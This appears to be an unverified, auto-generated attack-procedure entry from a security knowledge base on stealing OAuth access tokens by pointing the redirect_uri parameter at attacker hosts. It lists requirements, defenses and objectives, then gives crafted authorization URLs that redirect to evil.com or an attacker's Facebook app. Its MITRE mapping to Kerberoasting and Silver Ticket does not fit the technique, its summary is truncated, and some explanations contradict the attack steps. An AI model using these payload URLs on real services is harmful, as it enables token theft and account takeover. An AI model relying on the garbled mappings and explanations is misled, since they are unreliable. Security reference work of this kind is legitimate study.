---
id: 9d30331e-4bb3-43b7-b017-4e004ee0d810
name: OAuth Token Theft via Redirect URI
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:31.612186+00:00'
updated_at: '2023-04-10T20:23:04.189549+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[Kerberoasting|T1558.003 - Kerberoasting]]'
- '[[Silver Ticket|T1558.002 - Silver Ticket]]'
tags:
- '[[Grabbing OAuth Token via redirect_uri]]'
- '[[OAuth Misconfiguration]]'
commands:
- '[[Attempt to authorize with OAuth]]'
- '[[Redirect to Attacker''s Website]]'
- '[[Redirect to Authorization Endpoint]]'
---

# OAuth Token Theft via Redirect URI

## Summary

This procedure involves exploiting a misconfigured OAuth implementation to steal an access token via the redirect_uri parameter. Attackers can do this by modifying the redirect_uri parameter to point to a malicious website that logs the access token. This can be used to gain access to sensitive res

## Description

# Description

This procedure involves exploiting a misconfigured OAuth implementation to steal an access token via the redirect_uri parameter. Attackers can do this by modifying the redirect_uri parameter to point to a malicious website that logs the access token. This can be used to gain access to sensitive resources and data that are protected by OAuth. The technical details of this attack involve intercepting the OAuth authorization flow and manipulating the redirect_uri parameter to redirect the user to a malicious site that logs the access token. The business value of this attack is that it can be used to gain access to sensitive data and resources that are protected by OAuth.

## Requirements

1. Access to the OAuth authorization flow

1. Ability to intercept and modify the redirect_uri parameter

1. Access to a malicious website to log the access token

## Defense

1. Implement strict OAuth authorization URL validation and whitelisting

1. Use secure redirect_uris that cannot be easily manipulated

1. Implement rate limiting and monitoring on OAuth authorization requests

## Objectives

1. Steal OAuth access tokens

1. Gain unauthorized access to sensitive resources and data

# Instructions

1. To authorize sign in URLs, use the following commands:

**Code**: [[https://www.example.com/signin/authorize?[...]&red]]

> The `authorize sign in URLs` command allows you to authorize multiple sign in URLs for your application. This is useful when you have multiple domains or subdomains that you want to allow access to your application. To use this command, simply replace the `[...]` in the URL with the appropriate parameters for your application. The `redirect_uri` parameter specifies the URL that the user will be redirected to after successful authentication. Be sure to use a trusted domain for this parameter to prevent phishing attacks. You can use this command in PowerShell or any other command-line interface that supports HTTP requests.

2. To get the access token, redirect to the provided Open URL in a web browser and follow the instructions provided on the page.

**Code**: [[https://www.example.com/oauth20_authorize.srf?[...]]

> The Open URL provided in the 'data' field is used to initiate the OAuth 2.0 authorization process and obtain an access token. The 'redirect_uri' parameter in the URL specifies the callback URL to which the authorization server will redirect the user after the authorization is complete. In this case, the 'redirect_uri' parameter is set to a malicious URL that could potentially steal the user's access token. It is important to ensure that the 'redirect_uri' parameter is set to a trusted and secure URL to prevent unauthorized access to the user's access token.

**Command** ([[Redirect to Authorization Endpoint]]):

```bash
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
```

**Command** ([[Redirect to Attacker's Website]]):

```bash
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

3. To ensure the security of your OAuth implementation, only whitelist specific URLs for 'redirect_uri' instead of entire domains.

**Code**: [[https://www.example.com/admin/oauth/authorize?[...]]

> The 'redirect_uri' parameter in an OAuth authorization request specifies the URI that the authorization server will send the user back to after the user grants or denies the request. If 'redirect_uri' is not properly restricted, this can lead to an Open Redirect vulnerability where an attacker can craft a malicious URL that redirects the user to a phishing site or other malicious content. To prevent this, only whitelist specific URLs for 'redirect_uri' instead of entire domains. This ensures that the user is only redirected to trusted URLs and reduces the risk of an attacker exploiting the 'redirect_uri' parameter.

**Command** ([[Attempt to authorize with OAuth]]):

```bash
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[Kerberoasting|T1558.003 - Kerberoasting]]
- [[Silver Ticket|T1558.002 - Silver Ticket]]

## Commands Used

- [[Attempt to authorize with OAuth]]
- [[Redirect to Attacker's Website]]
- [[Redirect to Authorization Endpoint]]

## Tags

- [[Grabbing OAuth Token via redirect_uri]]
- [[OAuth Misconfiguration]]
